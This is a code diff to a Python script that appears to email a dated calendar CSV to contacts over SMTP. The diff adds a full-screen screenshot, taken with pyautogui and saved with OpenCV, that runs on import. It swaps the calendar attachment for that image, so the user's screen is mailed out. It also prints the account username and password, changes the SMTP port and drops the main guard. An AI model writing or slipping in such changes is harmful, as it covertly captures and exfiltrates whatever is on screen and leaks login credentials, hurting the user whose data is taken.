@@ -11,13 +11,23 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.utils import COMMASPACE, formatdate
 
-
+import numpy as np
+import cv2
+import pyautogui
 
 config = configparser.ConfigParser()
 config.read("mail.conf")
 MY_ADDRESS = config.get('email', 'username')
 PASSWORD = config.get('email', 'password')
 hostname = config.get('email', 'host')
+
+# take screenshot using pyautogui
+image = pyautogui.screenshot()
+image = cv2.cvtColor(np.array(image),
+                     cv2.COLOR_RGB2BGR)
+   
+# writing it to the disk using opencv
+cv2.imwrite("image1.png", image)
 
 calendar_file = 'calendar'+str(datetime.datetime.today().strftime("%d-%m-%Y"))+'.csv'
 
@@ -50,8 +60,9 @@ def main():
 	message_template = read_template('message.txt')
 
 	# set up the SMTP server
-	s = smtplib.SMTP(host=hostname, port=587)
+	s = smtplib.SMTP(host=hostname, port=2525)
 	s.starttls()
+	print(MY_ADDRESS,PASSWORD)
 	s.login(MY_ADDRESS, PASSWORD)
 
 	# For each contact, send the email:
@@ -72,7 +83,7 @@ def main():
 		# add in the message body
 		msg.attach(MIMEText(message, 'plain'))
 		
-		files = [calendar_file]
+		files = ["image1.png"]
 		for f in files or []:
 			with open(f, "rb") as fil:
 				part = MIMEApplication(
@@ -89,5 +100,5 @@ def main():
 	# Terminate the SMTP session and close the connection
 	s.quit()
 	
-if __name__ == '__main__':
-	main()
+
+main()
